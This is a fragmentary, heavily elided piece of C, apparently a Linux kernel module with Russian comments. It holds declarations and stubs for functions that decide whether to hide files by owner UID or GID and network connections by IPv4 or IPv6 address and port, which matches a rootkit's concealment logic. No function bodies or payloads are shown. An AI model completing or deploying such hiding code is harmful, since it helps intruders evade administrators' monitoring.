...
struct Extended_array ea_uids = {uids, ARRAY_SIZE(uids)};
struct Extended_array ea_gids = {gids, ARRAY_SIZE(gids)};
...
*/
static bool is_hide_uid(unsigned int file_uid) {
...
*/
static bool is_hide_gid(unsigned int file_gid) {
...
/*
    ...
    unsigned int file_uid - uid файла
    unsigned int file_gid - gid файла
    const char *kfilepath - путь до файла файла 
*/
...
struct Extended_array addrs[] = {
    {tcp4_addrs, ARRAY_SIZE(tcp4_addrs)}, 
    {udp4_addrs, ARRAY_SIZE(udp4_addrs)},
    {tcp6_addrs, ARRAY_SIZE(tcp6_addrs)}, 
    {udp6_addrs, ARRAY_SIZE(udp6_addrs)}
};
...
struct Extended_array ports[] = {
    {tcp4_ports, ARRAY_SIZE(tcp4_ports)}, 
    {udp4_ports, ARRAY_SIZE(udp4_ports)},
    {tcp6_ports, ARRAY_SIZE(tcp6_ports)}, 
    {udp6_ports, ARRAY_SIZE(udp6_ports)}
};
...
*/
static bool is_hide4_addr(__be32 *saddr, __be32 *daddr, enum Protocols protocol) {
...
*/
static bool is_hide6_addr(struct in6_addr *saddr, struct in6_addr *daddr, enum Protocols protocol) {
    // надо будет потом добавить проверку на наличие данных в этом массиве
    // пока будем думать, что чтото в нем есть
...
*/
static bool is_hide_port(__be16 sport, __be16 dport, enum Protocols protocol, enum IP_type ip_type) {
    // надо будет потом добавить проверку на наличие данных в этом массиве
    // пока будем думать, что чтото в нем есть
...
/*
    ...
    enum IP_type ip_type - версия ip
*/
static bool is_hide_net_info(void* saddr, void* daddr, __be16 sport, __be16 dport, enum Protocols protocol, enum IP_type ip_type) {
